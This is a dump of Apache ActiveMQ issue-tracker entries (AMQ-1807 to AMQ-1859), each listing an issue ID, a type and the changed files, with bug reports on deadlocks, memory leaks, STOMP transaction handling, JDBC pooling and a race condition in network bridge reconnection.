In our environment, we have several ActvieMQ CPP clients sending persistent messages continuously to a ActiveMQ 5.1 broker. In normal condition the broker works fine until it ran out of disk space. At that point the client would receive out of disk space advisory message AFTER sending the message, therefore the message should be removed from broker, however, the message are kept in the memory due to a problem in the DataFileAppender & AsyncDatamanager, when the disk is full, the message is saved in the inflightWrites map but never taken out since the enqueue will fail due to IOException.        synchronized (this) {            // Find the position where this item will land at.            DataFile dataFile = dataManager.allocateLocation(location);            if( !sync ) {                inflightWrites.put(new WriteKey(location), write);            }            batch = enqueue(dataFile, write);        }and        synchronized (this) {            // Find the position where this item will land at.            DataFile dataFile = dataManager.allocateLocation(location);            inflightWrites.put(new WriteKey(location), write);            batch = enqueue(dataFile, write);        }
issueID:AMQ-1807
type:Bug
changed files:
texts:Activemq stops dispatching messages aborting transaction (STOMP)
As requested by Dejan Bosanac, I"m adding this ticket. I"m willing to help fix it, ie. I can get my hands dirty, but I must have some pointers on where to look because (unfortunately) I don"t have much time to learn ActiveMQ"s internals and architecture.A copy of the email I sent to the users mailing-list:=============================================I"m currently struggling to understand the reason behind that"s causing the behaviour described in the subject: I"m connecting to activemq via stomp on a python app. Because I need to have the messages rolled back in case of some processing failure I"m wrapping the message processing in the following way: message received -> start transaction -> ack message in transaction ->process message -> if no exception commit tx, else rollback transactionAFAIK, this is the only way of making message unacknowledgement possible with stomp. Also, this is a single client connection, ie. I"m using asingle client connection to create a message processing daemon, all messages are sent and received via this single connection to the MQ server.Here"s a telnet session that can be used to reproduce the problem (open jconsole and send 5 text messages to the queue):% telnet localhost 61613Trying 127.0.0.1...Connected to localhost.Escape character is "^]".CONNECT^@CONNECTEDsession:ID:starfish-53281-1213736462979-2:2SUBSCRIBEdestination: /queue/testqack: clientactivemq.prefetchSize: 1^@MESSAGEmessage-id:ID:starfish-53281-1213736462979-3:3:1:1:1destination:/queue/testqtimestamp:1213736837743expires:0priority:01BEGINtransaction: 1^@ACKmessage-id:ID:starfish-53281-1213736462979-3:3:1:1:1transaction: 1^@MESSAGEmessage-id:ID:starfish-53281-1213736462979-3:4:1:1:1destination:/queue/testqtimestamp:1213736840224expires:0priority:02MESSAGEmessage-id:ID:starfish-53281-1213736462979-3:5:1:1:1destination:/queue/testqtimestamp:1213736842611expires:0priority:03ABORT   transaction: 1^@BEGIN transaction:2^@ACKmessage-id:ID:starfish-53281-1213736462979-3:4:1:1:1transaction:2^@ABORTtransaction:2^@ACKmessage-id:ID:starfish-53281-1213736462979-3:5:1:1:1^@I see a couple of issues here:#1) even though I specified activemq.prefetchSize to 1 in the subscription command, the connector dispatches two messages in a row#2) no more messages are dispatched after aborting the transaction/acknowledging the last received message. Even if the second message isn"t wrapped in a transaction, message dispatch stops there.To add to the confusion, if I don"t use transactions at all, my client keeps getting messages, one by one, ie. no two messages are sent together, I only get a new message after ACK"ing the previous one.I think I may be stepping into the realms of a buggy STOMP connector. Please tell me if I"m missing something obvious that fixes this issue(hence making it a non-issue) or if indeed the STOMP connector has problems.
issueID:AMQ-1808
type:Bug
changed files:
texts:java.lang.NullPointerException with jmx and durable topc subscription removal
ERROR ManagedRegionBroker            - Failed to register subscription SubscriptionInfo {subscribedDestination = null, destination = topic://HQ_ProductFamilyT71, clientId = lando_VM7_SPAgent3_0, subscriptionName = SP_CallForOffersEH_3_EHID_1PF34, selector = null}java.lang.NullPointerException        at org.apache.activemq.broker.jmx.DurableSubscriptionView.<init>(DurableSubscriptionView.java:47)        at org.apache.activemq.broker.jmx.InactiveDurableSubscriptionView.<init>(InactiveDurableSubscriptionView.java:42)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.addInactiveSubscription(ManagedRegionBroker.java:361)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.unregisterSubscription(ManagedRegionBroker.java:325)        at org.apache.activemq.broker.jmx.ManagedRegionBroker.unregisterSubscription(ManagedRegionBroker.java:217)        at org.apache.activemq.broker.jmx.ManagedTopicRegion.destroySubscription(ManagedTopicRegion.java:51)        at org.apache.activemq.broker.region.AbstractRegion.removeConsumer(AbstractRegion.java:327)        at org.apache.activemq.broker.region.TopicRegion.removeSubscription(TopicRegion.java:143)        at org.apache.activemq.broker.region.RegionBroker.removeSubscription(RegionBroker.java:409)        at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:98)        at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:98)        at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:98)        at org.apache.activemq.broker.MutableBrokerFilter.removeSubscription(MutableBrokerFilter.java:105)        at org.apache.activemq.broker.TransportConnection.processRemoveSubscription(TransportConnection.java:326)        at org.apache.activemq.command.RemoveSubscriptionInfo.visit(RemoveSubscriptionInfo.java:83)        at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:180)        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143)        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206)        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:197)        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:184)        at java.lang.Thread.run(Thread.java:595)
issueID:AMQ-1809
type:Bug
changed files:
texts:Failure with JDBCPersistenceAdapter
When using jdbcPersistenceAdapter with Oracle using DBCP BasicDataSource and poolPreparedStatements set to true (default ActiveMQ configuration), the DBCP pool does not work corretly and opens lots of new connections instead of reusing old ones. It does so until connection count is so high, that database server starts refusing new connections and an exception is thrown. Problem can be avoided by setting poolPreparedStatements to false and fixed by updating commons-dbcp-1.2.jar to version commons-dbcp-1.2.2.jarThe exception is java.sql.SQLException: Výjimka vstupu/výstupu: Got minus one from a read call(Full stack trace is in attached text file)
issueID:AMQ-1810
type:Bug
changed files:AbstractTempRegion.java
texts:Patch for stop connection in case of PooledConnection and broker not available (deadlock)
If a client tries to connect to the broker and the broker is not available the client can"t be stopped because of a deadlock in ActiveMQConnection.The problem is that the thread that wants to establish the connection is stuck in syncSendPacket() which is called from inside ensureConnectionInfoSent() which is synchronized (and holds the lock on the ActiveMQConnection instance). The call to close() calls stop() and this will call checkClosedOrFailed() which is synchronized, too, and there is the deadlock.The patch has removed the synchronized on the ensureConnectionInfoSent() and uses a mutex instead to prevent calling the method unsynchronized.Another problem is that PooledConnectionFactory is triggered from Spring classes to create connections even if the PooledConnectionFactory was stopped (call to stop() and the new created connections can not be stopped normally later. I have added a stopped flag that prevents the creation of new connecions after stop() was called.I think the issue AMQ-1470 is related to the same problem. The patch also contains the patch for AMQ-1791.
issueID:AMQ-1811
type:Bug
changed files:ActiveMQConnection.java
texts:Error introduced in throwing Exceptions in ActiveMQConnection.syncSendPacket()
None
issueID:AMQ-1812
type:New Feature
changed files:
texts:Message Group facility
Would be handy to have a Group facility for clients with membership info and shared state - for ownership of resources (e.g. Queue dispatching in clusters) etc.
issueID:AMQ-1813
type:Bug
changed files:BrokerService.java
MasterConnector.java
texts:shutdownOnMasterFailure="true" is ignored when broker starting
If slave broker cannot connect to master when slave broker starting, slave broker doesn"t stop starting and starts all connectorsI think it"s a bad behavior. It must shutdown when shutdownOnMasterFailure="true"
issueID:AMQ-1814
type:Bug
changed files:IndexItem.java
AMQPersistenceAdapterFactory.java
HashIndex.java
IndexManager.java
AMQPersistenceAdapter.java
texts:IndexManager keeps an inaccurate free list
The IndexManager recycles IndexItems - resuing free indexes when possible. However because the free list was inaccurately maintained - the index file is forced to grow larger than needed.
issueID:AMQ-1816
type:Bug
changed files:Statements.java
texts:JDBC-Adapter: Inconsistent lower/uppercase of the database field TIME
The name of the database field ACTIVEMQ_LOCK.TIME is inconsistent in org.apache.activemq.store.jdbc.Statements: in getCreateSchemaStatements() its name is "TIME" (upper case) while in getLockUpdateStatement() it"s called "time" (lower case). This causes problems with databases using a case-sensitive collation.I suggest using the uppercase variant, since this is more consistent with the naming of the other fields.
issueID:AMQ-1817
type:Bug
changed files:
texts:MESSAGE frame should not have the "receipt" header
When a producer STOMP client SEND messages with a "receipt" header the consumer STOMP client MESSAGE should not contain the "receipt" header, mainly because that header is to be processed solely by AMQ (and only when it receives the SEND).
issueID:AMQ-1818
type:Bug
changed files:StompTransportFilter.java
texts:transport deadlock attempting to shutdown the broker
While attempting to shutdown a JVM with an embedded broker listening on a stomp+ssl port, I ran into the following deadlock:Found one Java-level deadlock:============================="ActiveMQ Transport: ssl:///127.0.0.1:43713":  waiting to lock monitor 0x8d587f70 (object 0x9b8362b0, a java.lang.Object),  which is held by "BrokerService""BrokerService":  waiting to lock monitor 0x08901314 (object 0x9b8527b0, a java.lang.Object),  which is held by "ActiveMQ Transport: ssl:///127.0.0.1:43713"Java stack information for the threads listed above:==================================================="ActiveMQ Transport: ssl:///127.0.0.1:43713": at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - waiting to lock <0x9b8362b0> (a java.lang.Object) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1188) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:776) at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:735) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206) - locked <0x9b852bb0> (a org.apache.activemq.transport.InactivityMonitor$1) at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:80) - locked <0x9b8527b0> (a java.lang.Object) at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:134) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompUnsubscribe(ProtocolConverter.java:424) at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommad(ProtocolConverter.java:184) at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:104) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:196) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:183) at java.lang.Thread.run(Thread.java:619)"BrokerService": at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:80) - waiting to lock <0x9b8527b0> (a java.lang.Object) at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:71) at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommad(ProtocolConverter.java:550) at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:59) at org.apache.activemq.transport.InactivityMonitor.oneway(InactivityMonitor.java:233) - locked <0x9b857d50> (a java.util.concurrent.atomic.AtomicBoolean) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - locked <0x9b8362b0> (a java.lang.Object) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1188) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:776) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:813) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)Found 1 deadlock.
issueID:AMQ-1819
type:Bug
changed files:TransportConnection.java
texts:Deadlock occurs with a duplex network connection.
here"s the deadlock info:Java stack information for the threads listed above:==================================================="NetworkBridge: java.util.concurrent.ThreadPoolExecutor$Worker@142a59e": at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - waiting to lock <0x99f44d70> (a java.lang.Object) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport$5.run(DemandForwardingBridgeSupport.java:341) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)"BrokerService": at org.apache.activemq.broker.TransportConnection.lookupConnectionState(TransportConnection.java:1329) - waiting to lock <0x99f44ec8> (a org.apache.activemq.broker.TransportConnection) at org.apache.activemq.broker.TransportConnection.getConsumerBrokerExchange(TransportConnection.java:1246) - locked <0x99f667d8> (a java.util.HashMap) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:443) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:196) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:293) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:113) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - locked <0x99f44d70> (a java.lang.Object) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:595) at org.apache.activemq.network.DemandForwardingBridgeSupport$1.onCommand(DemandForwardingBridgeSupport.java:143) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:113) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - locked <0x99f44eb0> (a java.lang.Object) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1188) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:777) at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:814) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:885) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:907) at java.lang.Thread.run(Thread.java:619)"ActiveMQ Transport Initiator: vm://localhost#18": at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40) - waiting to lock <0x99f44eb0> (a java.lang.Object) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1188) at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:777) at org.apache.activemq.broker.TransportConnection.start(TransportConnection.java:860) - locked <0x99f44ec8> (a org.apache.activemq.broker.TransportConnection) at org.apache.activemq.broker.TransportConnector$1$1.run(TransportConnector.java:159)
issueID:AMQ-1833
type:Bug
changed files:Topic.java
texts:Topic messages cause MemoryUsage to increase slowly over time
In our particular scenario we were using ActiveMQ 5.0.0.14-fuse with ServiceMix 3.2.1 and JMS binding components configured via spring using a VMTransport in our connection factory.<?xml version="1.0" encoding="UTF-8"?><beans  xmlns:jms="http://servicemix.apache.org/jms/1.0">      <jms:consumer service="xsite:jms-consumer"                                    endpoint="myConsumer"                                    targetService="impl:eip-pipeline"                                    targetEndpoint="transformXML"                                    destinationName="queue.input"                                    connectionFactory="#connectionFactory"                                    cacheLevel="3"                                    transacted="jms" />      <jms:connectionFactory brokerURL="vm://localhost"/></beans>What we see is a small memory leak related to advisory messages where the broker MemoryUsage is incremented slowly over time.  After investigating this further we saw that certain messages references were being incremented more than they were decremented.  As a result the method org.apache.activemq.usage.MemoryUsage.decreaseUsage() was not being called when needed inside the org.apache.activemq.command.Message.decrementReferenceCount() due to the referenceCount being invalid.  AFter a while, 2days or so, with our configuration producerFlowControl would stop the flow of messages (invalidly) due to this problem.
issueID:AMQ-1834
type:Bug
changed files:HashIndex.java
texts:Hash Resize issue for message store
The HashIndex doesn"t calculate the hash bin number correctly when resizing
issueID:AMQ-1838
type:Bug
changed files:PrefetchSubscription.java
texts:ActiveMQ inflightcount queue statistics aren&#39;t decremented when using transactions or when messages are sent to the DLQ
None
issueID:AMQ-1839
type:Improvement
changed files:Scheduler.java
texts:There&#39;s no way to stop thread spawned by org.apache.activemq.thread.Scheduler
When ActiveMQ is unloaded (for instance, if it was loaded by a web-application from its WEB-INF/lib), a timer thread spawned by Scheduler still remains in memory, which prevents a classloader to be unloaded. There"s no any way to stop the timer explicitly.Attaching a patch which adds a shutdown method which may be called when ActiveMQ is unloaded.
issueID:AMQ-1840
type:Improvement
changed files:MessageServletSupport.java
texts:relative part of the URI is not captured as destination if http contents contains a "destination" input with an empty value.
Given http://www.acme.com/queue/orders/input as the  uri, "orders/input"  will not be treated as orders.input  destination as long as there is a destination input field defined. This is the correct use case except  when the input field "destination" has an empty value then the relative part of the uri  should be treated  as the destination.
issueID:AMQ-1842
type:Bug
changed files:KahaDBStore.java
texts:HashIndex leaks file handles when destination is removed
When a destination is removed, all open file handles inside HashIndex will be leaked because HashIndex.clear() closes the index, deletes the backing store files, then reopens the files.  There is no provision for closing the HashIndex without reopening the files.  Eventually the broker runs out of file handles and hangs.For reference, here is the stack trace down to HashIndex.clear from the removeDestination call:   at org.apache.activemq.kaha.impl.index.hash.HashIndex.clear(HashIndex.java:313)   at org.apache.activemq.kaha.impl.container.MapContainerImpl.clear(MapContainerImpl.java:385)   at org.apache.activemq.store.kahadaptor.KahaReferenceStore.removeAllMessages(KahaReferenceStore.java:201)   at org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore.removeAllMessages(KahaTopicReferenceStore.java:320)   at org.apache.activemq.store.amq.AMQMessageStore.removeAllMessages(AMQMessageStore.java:503)   at org.apache.activemq.broker.region.Topic.dispose(Topic.java:452)   at org.apache.activemq.broker.region.AbstractRegion.dispose(AbstractRegion.java:469)   at org.apache.activemq.broker.region.AbstractRegion.removeDestination(AbstractRegion.java:185)   at org.apache.activemq.broker.region.RegionBroker.removeDestination(RegionBroker.java:289)   at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:146)   at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:146)   at org.apache.activemq.advisory.AdvisoryBroker.removeDestination(AdvisoryBroker.java:173)   at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:146)   at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:153)   at org.apache.activemq.broker.BrokerFilter.removeDestination(BrokerFilter.java:146)   at org.apache.activemq.broker.MutableBrokerFilter.removeDestination(MutableBrokerFilter.java:153)...
issueID:AMQ-1843
type:New Feature
changed files:
texts:support a Protocol Buffer protocol for easier binary interop with other languages and systems
See http://code.google.com/apis/protocolbuffers/docs/overview.html for more detail.We could generate the proto file from the OpenWire beans in the short term maybe?
issueID:AMQ-1846
type:Task
changed files:PolicyEntry.java
ActiveMQPrefetchPolicy.java
AbstractSubscription.java
QueueRegion.java
texts:Provide tags to set defaultPrefetchSize in activemq.xml
HiIf we could have facility to set the defaultPrefetchSize in activemq.xml, it will be great feature.ThanksBadri
issueID:AMQ-1847
type:Bug
changed files:
texts:Redelivery on a failure doesn&#39;t respect the initialRedeliveryDelay on the first attempt.
Hi.I"m using ActiveMQ 5.1 together with Spring"s DefaultMessageListenerContainer to enable MDPs. I"m using the redeliveryPolicy to enable redelivery on failures during consumption of a message. ActiveMQ configuration looks like this:    <camelContext id="camel" xmlns="http://activemq.apache.org/camel/schema/spring">        <route errorHandlerRef="deadLetterErrorHandler">                <from uri="activemq:NEW" />        </route>    </camelContext><bean id="deadLetterErrorHandler" class="org.apache.camel.builder.DeadLetterChannelBuilder">    <property name="redeliveryPolicy" ref="redeliveryPolicyConfig"/></bean><bean id="redeliveryPolicyConfig" class="org.apache.camel.processor.RedeliveryPolicy">    <property name="maximumRedeliveries" value="4"/>    <property name="initialRedeliveryDelay" value="30000"/>    <property name="useExponentialBackOff" value="true"/>    <property name="backOffMultiplier" value="2" /></bean>Now if a failure occurs, the configured delay isn"t used on the first redelivery attempt. Instead redelivery takes place immediately after the failure occured. This sounds odd to me, since the property is even called initialRedeliveryDelay . I know that maybe this was caused due to the following issue:https://issues.apache.org/activemq/browse/AMQ-1032In my opinion immediately redelivery isn"t very useful in most cases. If a failure occurs, it won"t be fixed some ms later . So my suggestion is (in respect to AMQ-1032) to have two options:initialRedeliveryDelayredeliveryDelaySo both configurations would be possible. For AMQ-1032 just configure initialRedeliveryDelay to 0. Otherwise just take the redeliveryDelay as initialRedeliveryDelay to get what I want .Does this make sense?
issueID:AMQ-1848
type:Bug
changed files:
texts:TransportConnection MBeans leaked on duplex network connector disconnect
multiple restarts of a broker with a duplex network connector will result in multiple connection mbeans in the network target broker. These MBeans are not cleaned up on network disconnect.These leaked MBeans have names of the form: org.apache.activemq:BrokerName=broker,Type=Connection,ConnectorName=tcp_//localhost_61616,ViewType=address,Name=/127.0.0.1_3895
issueID:AMQ-1849
type:Bug
changed files:
texts:Slave threads increasing when sending to temporary queue
Deployed the attached TextMDB (modified JBoss example) to our JBoss 4.0.5 GA server (cluster). send a message to "queue.A" with Reply To set to "queue.REPLY_A"The TextMDB bean:  creates a temporary queue with NON_PERSISTENT delivery mode forwards message body to "queue.B" and sets the reply queue to this temporary queue another (or the same) instance of TextMDB replies and adds some text, replies to the temporary queue the first TextMDB replies to "queue.REPLY_A"Works fine, except that every time a temporary queue message is sent, the number of threads on the slave increases by 3.On the master the threads are destroyed after a while, but on the slave they persist, growing to "OutOfMemoryError: unable to create new native thread"Temporary queue Thread Name example: TempQueue:  ID:{HOSTNAME}-59619-1215591084487-0:16:5+ 2 topic threadsThat thread ID can be found ActiveMQ messages in the attached JBoss log.Have I created a bug im my code or have I found a bug in the ActiveMQ server?
issueID:AMQ-1852
type:Improvement
changed files:TcpTransport.java
texts:Update TcpTransport for better error handling
TcpTransport should catch Throwable - see http://www.nabble.com/Minor-modification-to-TcpTransport.java-for-better-error-handling--td18376698.html
issueID:AMQ-1853
type:Wish
changed files:
texts:Optional non-blocking redelivery
When a message is redelivered the consumer blocks for the amount of time specified by the redelivery delay. For a high load scenario where message order is irrelevant this is just reducing performance and will result in a complete halt if the delay is long and several bad messages are consumed in a short time. I think what I basically wish for is how it worked in versions 3.x, prior to fix for AMQ-268. So I would very much like to have configurable option to NOT block consumers when redelivering messages. If no-one feels up to it, I"d still appreciate some hints and I could try to fix it myself. Looking at ActiveMQMessageConsumer.rollback(), I was thinking something in the lines of just scheduling a task to put the message back on queue after a delay - if configured to, instead of stopping delivery and a schedule a task to resume delivery again. But I do not possess an understanding of AMQ thorough enough to predict potential side effects of this, so any analysis would be helpful.
issueID:AMQ-1855
type:Bug
changed files:
texts:bridge reconnection stops because of race in SimpleDiscoveryAgent
I believe there is a race condition in SimpleDiscoveryAgent which can cause subsequent bridge restart to fail, without starting new thread that should restart a bridge. As a consequence, network bridge is never restarted.Following scenario leads to this:1. bridge is disconnected (e.g. local error: org.apache.activemq.transport.InactivityIOException: Channel was inactive for too long)2. bridge is disposed in separate thread in DemandForwardingBridge.serviceLocalException3. SimpleDiscoveryAgent.serviceFailed is called which starts up another thread which calls DiscoveryNetworkConnector.onServiceAdd which tries to restart bridge4. bridge startup can cause javax.jms.InvalidClientIDException: Broker: some_broker2 - Client: NC_some_broker1_inboundlocalhost already connected (this one is caused by race condition with thread disposing the bridge, since given client subscription should be removed by thread disposing the bridge (step 2)5. this causes invocation of DemandForwardingBridge.serviceLocalException (this call can be made asynchronously, while previous bridge startup is still in progress)As a consequence, multiple threads can end up calling SimpleDiscoveryAgent.serviceFailed simultaneously.serviceFailed will call DiscoveryNetworkConnector.onServiceAdd which will try to reconnect bridge. Reconnect logic is guarded by if( event.failed.compareAndSet(false, true) ) which tries to ensure that only a single thread is reconnecting bridge at some point.    public void serviceFailed(DiscoveryEvent devent) throws IOException {             final SimpleDiscoveryEvent event = (SimpleDiscoveryEvent) devent;        if( event.failed.compareAndSet(false, true) ) {            listener.onServiceRemove(event);      Thread thread = new Thread() {       public void run() {          // We detect a failed connection attempt because the service fails right        // away.        if( event.connectTime + minConnectTime > System.currentTimeMillis()  ) {                  event.connectFailures++;                  if( maxReconnectAttempts>0 &&  event.connectFailures >= maxReconnectAttempts ) {          // Don" try to re-connect          return;         }                           synchronized(sleepMutex){                      try{                       if( !running.get() )                        return;                                                 sleepMutex.wait(event.reconnectDelay);                      }catch(InterruptedException ie){                                Thread.currentThread().interrupt();                         return;                      }                  }                   if (!useExponentialBackOff) {                      event.reconnectDelay = initialReconnectDelay;                  } else {                      // Exponential increment of reconnect delay.                      event.reconnectDelay*=backOffMultiplier;                      if(event.reconnectDelay>maxReconnectDelay)                          event.reconnectDelay=maxReconnectDelay;                  }                          } else {         event.connectFailures = 0;                     event.reconnectDelay = initialReconnectDelay;        }                                             if( !running.get() )               return;                      event.connectTime = System.currentTimeMillis();        event.failed.set(false);                listener.onServiceAdd(event);       }      };      thread.setDaemon(true);      thread.start();        }    }Prior to calling DiscoveryNetworkConnector.onServiceAdd, event.failed is set to false (T1), and it"s possible for some other thread (T2) to enter block guarded by if( event.failed.compareAndSet(false, true) ) , while reconnect process has already begun by first thread. T2 can satisfy condition: if( event.connectTime + minConnectTime > System.currentTimeMillis()  )  and will enter sleepMutex.wait(event.reconnectDelay), but still holding event.failed == true (causing all other calls to serviceFailed not to start thread that will reconnect bridge).If first thread (T1) fails to reconnect bridge (e.g because of InvalidClientIDException described in step 4), it will not schedule new thread to restart broker (and call DiscoveryNetworkConnector.onServiceRemove, and cleanup DiscoveryNetworkConnector.bridges) because of event.failed == true, and T2 still waiting (default 5 sec). When T2 wakes up from wait, it will try to restart broker and fail because of following condition in DiscoveryNetworkConnector:            if (    bridges.containsKey(uri)                     || localURI.equals(uri)                     || (connectionFilter!=null && !connectionFilter.connectTo(uri))                    )                return;bridges.containsKey(uri) will be true (thread T1 added it while unsuccessfully trying to reconnect bridge), and T2 will return from DiscoveryNetworkConnector.onServiceAdd and will not start bridge. No additional attempt to reconnect bridge will be made, since T2 held event.failed == true, effectively ignoring SimpleDiscoveryAgent.serviceFailed calls from other threads processing local or remote bridge exceptions.End result: DiscoveryNetworkConnector.bridges contains bridge that is disposed and prevents all other attempts to restart bridge (onServiceAdd always returns because bridges.containsKey(uri) == true) SimpleDiscoveryAgent doesn"t try to reconnect the bridge (T2 was a last attempt which returned without restarting the bridge - SimpleDiscoveryAgent.serviceFailed is not called again, since bridge is not startedI think that synchronization of threads processing bridge exceptions and entering SimpleDiscoveryAgent.serviceFailed should be verified and/or improved.Also, InvalidClientIDException is relatively common (at least on multicore machines, e.g. Solaris T2000), maybe ConduitBridge.serviceLocalException (which starts another thread doing ServiceSupport.dispose(DemandForwardingBridgeSupport.this)), should be changed to wait a bit for bridge disposal to finish (e.g. sleep for some time) and then try to restart a bridge - waiting for a second more to restart a bridge is better then not to start it at allI"ve seen this problem in 4.1.0 and 4.1.2, but I think it can occur in 5.1 and 5.2 trunk (SimpleDiscoveryAgent.serviceFailed and DiscoveryNetworkConnector.onServiceAdd are more or less the same, just using ASYNC_TASKS to execute asynchronous calls, instead of starting new threads directly.
issueID:AMQ-1856
type:Bug
changed files:AsyncDataManager.java
AMQMessageStore.java
texts:Deadlock in AMQMessageStore when using transactions
I am using ActiveMQ 5.1.0 with the AMQMessageStore (in the default configuration except data directory location) and sending/receiving transactionally using the VMTransport. This produced the deadlock shown in the attached (partial) thread dump, generated by jstack -l. In a nutshell, the VMTransport thread is holding the AMQMessageStore.lock=KahaReferenceStore.lock, acquired at AMQMessageStore.java:231, while awaiting a countDown on AMQMessageStore.flushLatch. The ActiveMQ Task (which is the AMQMessageStore.asyncWriteTask) should do the countDown on the flushLatch but is waiting on acquiring the KahaReferenceStore.lock first. Hence deadlock.Note that the condition messageAcks.size() > this.peristenceAdapter.getMaxCheckpointMessageAddSize() must be true for the deadlock to occur &#8211; this triggers the flush. Since the transport is one of the deadlocked threads, all access via the transport stops, making the broker unusable and making this issue a blocker for me. A comment (workaround?) as soon as possible would be much appreciated.
issueID:AMQ-1858
type:Bug
changed files:
texts:Integer overflow in default settings
From BrokerService, line 711-2:systemUsage.getTempUsage().setLimit(1024 * 1024 * 1024 * 100); // 10 GbsystemUsage.getStoreUsage().setLimit(1024 * 1024 * 1024 * 100); // 100 GBThe expression 1024 * 1024 * 1024 * 100 overflows int, so the above lines actually correspond to setLimit(0).Easy fix is to make one of the multipliers a long, for example:1024L * 1024 * 1024 * 100Other places may have the same problem, but I did not look for all places.
issueID:AMQ-1859
type:Bug
changed files:
texts:Race condition when browsing a queue with active Producers / Consumers
